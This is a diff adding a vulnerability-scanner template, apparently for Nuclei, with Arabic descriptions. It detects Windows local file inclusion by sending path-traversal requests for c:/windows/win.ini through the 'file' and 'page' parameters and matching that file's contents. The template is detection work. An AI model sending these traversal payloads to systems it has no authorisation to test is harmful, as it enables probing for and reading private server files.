@@ -1,0 +1,26 @@
+id: lfi-windows-winini
+info:
+  name: Local File Inclusion (Windows win.ini Arbitrary Read)
+  author: YemenScan-Core
+  severity: high
+  description: تضمين الملفات المحلية على أنظمة Windows يتيح قراءة ملف c:/windows/win.ini
+    والتأكد من إمكانية الوصول للملفات الداخلية.
+  remediation: تأمين معالجة المسارات ومنع استدعاء الملفات بواسطة معاملات GET/POST.
+  tags:
+  - lfi
+  - traversal
+  - windows
+http:
+- method: GET
+  path:
+  - '{{BaseURL}}/?file=c:/windows/win.ini'
+  - '{{BaseURL}}/?page=../../../../windows/win.ini'
+  matchers-condition: and
+  matchers:
+  - type: word
+    words:
+    - '[fonts]'
+    - '[extensions]'
+  - type: status
+    status:
+    - 200
